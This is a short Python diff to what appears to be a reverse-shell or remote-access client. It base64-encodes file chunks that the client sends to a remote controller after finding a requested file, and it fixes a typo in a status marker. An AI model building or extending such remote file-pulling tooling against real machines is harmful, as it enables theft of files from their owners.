@@ -207,7 +207,7 @@ def file_transfer_get(conn, file_name):      #push to server - response from a '
     if VERBOSE:
         print_info("Sending File:\n" + file_name)
     while data:
-        conn.send(data)
+        conn.send(base64_encode(data))
         data = f.read(1024)
     conn.send("[END]".encode('utf-8'))
     if VERBOSE:
@@ -372,7 +372,7 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
                 if path.exists(file_name):
                     if VERBOSE:
                         print_info("File Found! :) --> {}".format(file_name))
-                    send_data(conn, "[file-found]]")
+                    send_data(conn, "[file-found]")
                     file_transfer_get(conn, file_name)
                 else:
                     if VERBOSE:
